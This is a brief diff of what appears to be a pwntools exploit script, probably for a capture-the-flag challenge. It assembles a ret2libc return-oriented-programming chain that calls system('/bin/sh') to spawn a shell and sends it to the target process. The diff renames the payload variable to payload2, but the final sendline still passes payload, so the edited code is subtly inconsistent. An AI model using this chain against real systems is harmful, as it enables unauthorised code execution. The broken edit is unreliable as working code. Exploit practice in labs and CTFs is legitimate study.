@@ -43,11 +43,11 @@ info("system address: %#x", system)
 info("/bin/sh address: %#x", bin_sh)
 
 # Final payload to execute system("/bin/sh")
-payload = padding
-payload += p64(pop_rdi)
-payload += p64(bin_sh)
-payload += p64(ret_gadget)
-payload += p64(system)
+payload2 = padding
+payload2 += p64(pop_rdi)
+payload2 += p64(bin_sh)
+payload2 += p64(ret_gadget)
+payload2 += p64(system)
 
 io.recvuntil("Go ahead")
 io.sendline(payload)
